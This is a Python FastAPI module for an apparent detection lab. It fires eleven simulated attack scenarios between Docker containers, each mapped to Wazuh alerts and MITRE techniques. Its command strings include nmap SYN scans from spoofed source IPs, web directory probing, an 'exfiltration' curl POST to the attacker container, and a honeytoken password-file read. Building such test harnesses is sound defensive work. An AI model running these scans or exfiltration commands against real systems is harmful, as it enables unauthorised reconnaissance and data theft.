from fastapi import APIRouter, Request
import subprocess
import threading
import sqlite3
import os
import requests as http_requests

router = APIRouter()

# alerts.db is in the agent directory
DB_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../agent/alerts.db'))

def get_node_ip(node_id):
    """Dynamically fetch a node's real IP from the topology endpoint."""
    try:
        res = http_requests.get("http://localhost:8001/api/topology", timeout=2)
        nodes = res.json().get("nodes", [])
        for n in nodes:
            if n["id"] == node_id:
                return n["ips"][0] if n["ips"] else None
    except Exception:
        pass
    return None

SCENARIO_CONFIG = {
    "1": {
        "name": "TCP SYN Port Scan",
        "attacker_node": "attacker",
        "target_node": "victim-critical",
        "docker_cmd": "docker exec attacker sh -c 'ip addr add 10.0.1.11/24 dev eth0 2>/dev/null || true; nmap -S 10.0.1.11 -e eth0 -Pn -sS -p 1-100 -T5 --max-retries 1 {TARGET_IP}'",
        "zone": "protected-critical",
        "wazuh_event": "port_scan_detected",
        "mitre": "T1046",
    },
    "2": {
        "name": "HTTP Request Burst",
        "attacker_node": "attacker",
        "target_node": "victim-critical",
        "docker_cmd": "docker exec attacker sh -c 'ip addr add 10.0.1.12/24 dev eth0 2>/dev/null || true; for i in $(seq 1 6); do curl --interface 10.0.1.12 -s -m 0.5 http://{TARGET_IP}/ >/dev/null 2>&1 || true; done'",
        "zone": "protected-critical",
        "wazuh_event": "unusual_traffic_burst",
        "mitre": "T1499.001",
    },
    "3": {
        "name": "Internal Lateral Port Sweep",
        "attacker_node": "victim-user",
        "target_node": "victim-critical",
        "docker_cmd": "docker exec victim-user nmap -Pn -sS -p 21,22,80,443,3306 -T5 --max-retries 1 {TARGET_IP}",
        "zone": "protected-critical",
        "wazuh_event": "lateral_movement_detected",
        "mitre": "T1021",
    },
    "4": {
        "name": "Web Directory Discovery",
        "attacker_node": "attacker",
        "target_node": "victim-critical",
        "docker_cmd": "docker exec attacker sh -c 'ip addr add 10.0.1.14/24 dev eth0 2>/dev/null || true; for p in admin login api db config; do curl --interface 10.0.1.14 -s -m 0.5 http://{TARGET_IP}/$p >/dev/null 2>&1 || true; done'",
        "zone": "protected-critical",
        "wazuh_event": "port_scan_detected",
        "mitre": "T1083",
    },
    "5": {
        "name": "SSH Service Probing",
        "attacker_node": "attacker",
        "target_node": "victim-critical",
        "docker_cmd": "docker exec attacker sh -c 'ip addr add 10.0.1.15/24 dev eth0 2>/dev/null || true; nmap -S 10.0.1.15 -e eth0 -Pn -sS -p 22,2222,8022 -T5 --max-retries 1 {TARGET_IP}'",
        "zone": "protected-critical",
        "wazuh_event": "ssh_probe_detected",
        "mitre": "T1021.004",
    },
    "6": {
        "name": "Outbound Exfiltration Flow",
        "attacker_node": "victim-critical",
        "target_node": "attacker",
        "docker_cmd": "docker exec victim-critical sh -c 'for i in $(seq 1 5); do curl -s -m 0.5 -X POST -d \"CRITICAL_EXFIL_PAYLOAD\" http://{TARGET_IP}:8080/ >/dev/null 2>&1 || true; done'",
        "zone": "untrusted",
        "wazuh_event": "exfiltration_detected",
        "mitre": "T1041",
    },
    "7": {
        "name": "Internal Endpoint Crawl",
        "attacker_node": "victim-user",
        "target_node": "victim-critical",
        "docker_cmd": "docker exec victim-user sh -c 'for i in $(seq 1 5); do curl -s -m 0.5 http://{TARGET_IP}/ >/dev/null 2>&1 || true; done'",
        "zone": "protected-critical",
        "wazuh_event": "internal_endpoint_crawl",
        "mitre": "T1018",
    },
    "8": {
        "name": "Full TCP Connect Scan",
        "attacker_node": "attacker",
        "target_node": "victim-user",
        "docker_cmd": "docker exec attacker sh -c 'ip addr add 10.0.1.18/24 dev eth0 2>/dev/null || true; nmap -S 10.0.1.18 -e eth0 -Pn -sS -p 80,443,8000,8080,3000 -T5 --max-retries 1 {TARGET_IP}'",
        "zone": "protected-user",
        "wazuh_event": "port_scan_detected",
        "mitre": "T1046",
    },
    "9": {
        "name": "Ping Sweep Reachability",
        "attacker_node": "attacker",
        "target_node": "victim-critical",
        "docker_cmd": "docker exec attacker sh -c 'ip addr add 10.0.1.19/24 dev eth0 2>/dev/null || true; for i in $(seq 1 5); do ping -I 10.0.1.19 -c 1 -W 1 {TARGET_IP} >/dev/null 2>&1 || true; done'",
        "zone": "protected-critical",
        "wazuh_event": "ping_sweep_detected",
        "mitre": "T1018",
    },
    "10": {
        "name": "Authorized Health Polling (Baseline)",
        "attacker_node": "victim-user",
        "target_node": "victim-critical",
        "docker_cmd": "docker exec victim-user curl -s -m 1 http://{TARGET_IP}/ >/dev/null 2>&1 || true",
        "zone": "protected-critical",
        "wazuh_event": "benign_healthcheck",
        "mitre": "BASELINE",
    },
    "11": {
        "name": "Insider Threat (Honeytoken Access)",
        "attacker_node": "victim-user",
        "target_node": "victim-critical",
        "docker_cmd": "docker exec victim-user curl -s -m 1 http://{TARGET_IP}:9999/secret_passwords.txt >/dev/null 2>&1 || true",
        "zone": "protected-critical",
        "wazuh_event": "insider_threat_honeytoken",
        "mitre": "T1078.003",
    },
}

def run_scenario(cmd):
    # Run the actual Docker network command (non-blocking to UI)
    subprocess.run(cmd, shell=True, timeout=30,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

@router.post("/trigger-scenario")
async def trigger_scenario(req: Request):
    data = await req.json()
    scenario = str(data.get("scenario", ""))

    cfg = SCENARIO_CONFIG.get(scenario)
    if not cfg:
        return {"status": "error", "message": f"Unknown scenario: {scenario}"}

    # Dynamically resolve attacker IP and target IP from real Docker topology
    source_ip = get_node_ip(cfg["attacker_node"])
    target_ip = get_node_ip(cfg.get("target_node"))
    if not source_ip:
        # Fallback: run docker inspect to get it directly
        try:
            res = subprocess.run(
                ["docker", "inspect", "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", cfg["attacker_node"]],
                capture_output=True, text=True, timeout=5
            )
            source_ip = res.stdout.strip().split("\n")[0]
        except Exception:
            pass

    if not target_ip and cfg.get("target_node"):
        try:
            res = subprocess.run(
                ["docker", "inspect", "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", cfg["target_node"]],
                capture_output=True, text=True, timeout=5
            )
            target_ip = res.stdout.strip().split("\n")[0]
        except Exception:
            pass

    cmd = cfg["docker_cmd"]
    if "{TARGET_IP}" in cmd and target_ip:
        cmd = cmd.replace("{TARGET_IP}", target_ip)

    threading.Thread(target=run_scenario, args=(cmd,), daemon=True).start()
    return {"status": "started", "scenario": scenario, "source_ip": source_ip or "unknown", "target_ip": target_ip or "unknown"}
